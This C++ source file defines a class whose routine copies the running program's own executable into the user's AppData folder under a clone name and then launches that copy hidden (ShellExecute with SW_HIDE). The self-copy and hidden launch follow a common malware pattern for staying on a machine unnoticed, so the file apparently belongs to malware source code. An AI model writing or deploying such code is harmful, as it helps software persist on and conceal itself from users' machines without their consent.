
#include "pch.h"
#include "CP.h"
#include <windows.h>
#include <stdio.h>
#include <strsafe.h>

void CP::execute() {
	copy();
	start();
}

void CP::start() {
	string path = this->util.getAppDataPath() + this->util.getClone();
	ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_HIDE);
}

void CP::copy(){
	char* filename = this->util.getFileName();
	
	string path = this->util.getAppDataPath() + this->util.getClone();
	
	BOOL response = 0;
	CopyFile(filename,path.c_str(),response);
}
